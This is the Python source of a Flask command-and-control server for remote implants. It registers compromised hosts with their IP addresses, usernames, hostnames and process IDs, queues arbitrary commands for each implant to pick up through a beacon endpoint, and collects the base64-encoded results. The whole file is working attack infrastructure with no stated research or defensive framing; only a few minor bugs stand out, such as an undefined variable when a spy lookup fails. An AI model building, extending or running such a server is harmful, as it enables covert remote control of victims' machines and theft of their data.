from flask import Flask, request, jsonify
import itertools
import random
import string
from datetime import datetime, timedelta
import base64
from datetime import datetime  # Assuming you want to use datetime for timestamps

class Listener:
    def __init__(self, type, port, addr):
        self.type = type
        self.port = port
        self.addr = addr
	

class Spy:
    newId = itertools.count(start=1)

    def __init__(self):
        self.id = str(next(self.newId))
        self.guid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
        self.active = False
        self.intaddr = None
        self.extaddr = None
        self.username = None
        self.hostname = None
        self.ops = None
        self.pid = None
        self.mission = None  # Initialize mission
#	self.completed = None
        self.interval = None
        self.jitter = None
        self.firstcheckin = None
        self.lastcheckin = None
        self.output = None

    def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid):
        self.active = True
        self.intaddr = intaddr
        self.extaddr = extaddr
        self.username = username
        self.hostname = hostname
        self.ops = ops
        self.pid = pid
        self.firstcheckin = self.timestamp()
        self.lastcheckin = self.timestamp()
        self.output=""

    def checkin(self):
        self.lastcheckin = self.timestamp()
        if self.mission is not None:
            if self.mission == 'kill':
                self.active = False

    def timestamp(self):
        return datetime.now() 

listeners = []
spies = []



app = Flask(__name__)

@app.route("/register", methods=['POST'])
def get_register():
    data = request.json  # Access the JSON data sent in the request
    newspy = Spy()
    newspy.initial_checkin(data.get('intaddr'),data.get('extaddr'),data.get('username'),data.get('hostname'),data.get('ops'),data.get('pid'))
    spies.append(newspy)
    spy_details = {
        "ID": newspy.id,
        "GUID": newspy.guid,
        "Active": newspy.active,
        "First Check-in": newspy.firstcheckin.isoformat() if newspy.firstcheckin else None,
        "Last Check-in": newspy.lastcheckin.isoformat() if newspy.lastcheckin else None,
    }
    return jsonify(spy_details)

@app.route("/spies")
def list_spies():
    if not spies:
        return "<p>No spies registered.</p>"
    response = "Number of spies: " + str(len(spies)) + "<br><br>"
    for spy in spies:
        spy_details = (
            f"ID: {spy.id}<br>"
            f"GUID: {spy.guid}<br>"
            f"Active: {spy.active}<br>"
            f"Internal Address: {spy.intaddr}<br>"
            f"External Address: {spy.extaddr}<br>"
            f"Username: {spy.username}<br>"
            f"Hostname: {spy.hostname}<br>"
            f"OS: {spy.ops}<br>"
            f"PID: {spy.pid}<br>"
            f"First Check-in: {spy.firstcheckin}<br>"
            f"Last Check-in: {spy.lastcheckin}<br><br>"
        )
        response += spy_details
    return f"<p>{response}</p>"

@app.route("/spy/<id>", methods=['GET'])
def get_spy(id):
    if not spies:
        return "<p>No spies registered.</p>"

    for spy in spies:
        if spy.id == id:
            data = {
            "id": str(spy.id),
            "guid": spy.guid,
            "active": str(spy.active),
            "intaddr": str(spy.intaddr),
            "extaddr": str(spy.extaddr),
            "username": str(spy.username),
            "hostname": str(spy.hostname),
            "ops": str(spy.ops),
            "pid": str(spy.pid),
            "firstcheckin": str(spy.firstcheckin),
            "lastcheckin": str(spy.lastcheckin),
            "output": spy.output,
        }
    return jsonify(data)

@app.route("/cls/<id>", methods=['GET'])
def clean_output(id):
    if not spies:
        return "<p>No spies registered.</p>"

    for spy in spies:
        if spy.id == id:
            spy.output=""
    return "<p>Output cleared</p>"


# Client selects a spy and specify a mission for the spy
@app.route("/mission/<id>/<command>", methods=['GET'])  
def receive_mission(id, command):
    for spy in spies:
        if spy.id == id:
            if spy.mission != None: 
                return "<p>The mission queue is full, please wait for the execution of current mission<p>"
            else:
                spy.mission=command
                return "<p>Mission updated for spy"+spy.guid+"</p>"
    else:
        return "<p>The spy cannot be found<p>"


@app.route("/beacon", methods=['POST'])  
def beacon():
    data = request.json
    spy_id = data.get('id')

    for spy in spies:
        if spy.id == spy_id:
            spy.active = data.get('active', False)
            spy.lastcheckin = datetime.now()
            if spy.mission:
                mission = spy.mission
                spy.mission = None  # Clear the mission after assigning
                return jsonify({"command": mission})
            break
    return jsonify({"command": None})



@app.route("/result/<id>", methods=['POST'])  
def get_result(id):
    result = request.json.get('result')
    result_bytes=result.encode("ascii") 
    string_bytes=base64.b64decode(result_bytes)
    raw=string_bytes.decode("ascii")
    command = request.json.get('command')
    output="Command: "+command+"\nResult: "+raw
    for spy in spies:
        if spy.id == id:
            spy.output=output
            print(output)   
    return "<p>Result received</p>"



if __name__ == '__main__':
    app.run(debug=False)
